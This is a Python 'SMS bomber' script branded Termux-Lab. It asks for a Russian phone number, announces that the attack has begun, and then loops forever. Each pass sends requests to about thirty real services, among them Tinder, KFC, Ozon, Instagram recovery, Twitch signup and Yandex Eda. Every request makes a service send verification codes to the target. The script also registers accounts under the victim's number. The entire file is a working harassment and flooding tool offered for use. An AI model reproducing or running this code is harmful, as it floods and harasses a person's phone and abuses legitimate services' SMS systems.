import requests, random, datetime, sys, time, argparse, os, colorama
os.system("clear")
banner = """\033[36m
╔═╗────╔═╗╔╗─────────
║═╣╔══╗║═╣║╚╗╔═╗─╔══╗
╠═║║║║║╠═║║║║║╬╚╗║║║║ \033[0m \033[31m
╚═╝╚╩╩╝╚═╝╚╩╝╚══╝╚╩╩╝Termux-Lab\033[0m\033[33m
Tg: @termuxlab
Vk: @termux_lab
"""
print(banner)
_phone = input('\033[36m(79XXXXXXXXX)>>\033[0m \033[35m ')

if _phone[0] == '+':
	_phone = _phone[1:]
if _phone[0] == '8':
	_phone = '7'+_phone[1:]
if _phone[0] == '9':
	_phone = '7'+_phone

_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]

iteration = 0
print('Атака началась! \033[32m ')
print(' ')
while True:
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'
	try:
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
		print('\033[F[#]           ')
	except:
		print('\033[F[#] ')

	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
		print('\033[F[##]            ')
	except:
		print('\033[F[##]            ')

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
		print('\033[F[###]            ')
	except:
		print('\033[F[###]            ')
	try:
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
		print('\033[F[####]            ')
	except:
		print('\033[F[####]            ')

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print('\033[F[#]            ')
	except:
		print('\033[F[#]            ')

	try:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
		print('\033[F[##]            ')
	except:
		print('\033[F[##]            ')

	try:
		requests.get('https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
		print('\033[F[###]            ')
	except:
		print('\033[F[###]            ')

	try:
		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
		print('\033[F[####]            ')
	except:
		print('\033[F[####]            ')

	try:
		requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
		print('\033[F[#]            ')
	except:
		print('\033[F[#]            ')

	try:
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
		print('\033[F[##]            ')
	except:
		print('\033[F[##]            ')

	try:
		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
		print('\033[F[###]            ')
	except:
		print('\033[F[###]            ')

	try:
		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
		print('\033[F[####]            ')
	except:
		print('\033[F[####]            ')

	try:
		requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
		print('\033[F[#]            ')
	except:
		print('\033[F[#]            ')

	try:
		requests.get('https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
		print('\033[F[####]            ')
	except:
		print('\033[F[####]            ')

	try:
		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
		print('\033[F[#]            ')
	except:
		print('\033[F[#]            ')

	try:
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
		print('\033[F[##]            ')
	except:
		print('\033[F[##]            ')

	try:
		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		print('\033[F[###]            ')
	except:
		print('\033[F[###]            ')

	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print('\033[F[####]            ')
	except:
		print('\033[F[####]            ')

	try:
		requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/', data={'email_or_username': _phone, 'recaptcha_challenge_field':''})
		print('\033[F[#]            ')
	except:
		print('\033[F[#]            ')

	try:
		requests.post('https://vladikavkaz.edostav.ru/site/CheckAuthLogin', data={"phone_or_email":_phone}, headers={"Host": "vladikavkaz.edostav.ru",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0",
	"Accept": "application/json, text/javascript, */*; q=0.01",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate, br",
	"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
	"X-Requested-With": "XMLHttpRequest",
	"Content-Length": "26"})
		print('\033[F[##]            ')
	except:
		print('\033[F[##] ')
	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={"phone":_phone})
		print('\033[F[#]            ')
	except:
		print('\033[F[#]            ')
	try:
		requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
		print('\033[F[##]            ')
	except:
		print('\033[F[##]            ')
	try:
		requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone})
		print('\033[F[###]            ')
	except:
		print('\033[F[###]            ')
	try:
		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
		print('\033[F[####]            ')
	except:
		print('\033[F[#]            ')
	try:
		requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone})
		print('\033[F[#]            ')
	except:
		print('\033[F[#]            ')
	try:
		requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": _phone, "otpId": 0})
		print('\033[F[##]            ')
	except:
		print('\033[F[##]            ')
	try:
		requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +_phone, "action": "confirm_mobile"})
		print('\033[F[###]            ')
	except:
		print('\033[F[###]            ')
	try:
		requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone})
		print('\033[F[####]            ')
	except:
		print('\033[F[####]            ')
	try:
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + _phone})
		print('\033[F[#]            ')
	except:
		print('\033[F[#]            ')
	try:
		requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
		print('\033[F[#]            ')
	except:
		print('\033[F[#]            ')
	try:
		requests.post("https://msk.tele2.ru/api/validation/number/" +_phone,json={"sender": "Tele2"})
		print('\033[F[#]            ')
	except:
		print('\033[F[#]            ')
	try:
		requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": "+" +_phone})
		print('\033[F[##]            ')
	except:
		print('\033[F[##]            ')
	try:
		iteration += 1
	except:
		break
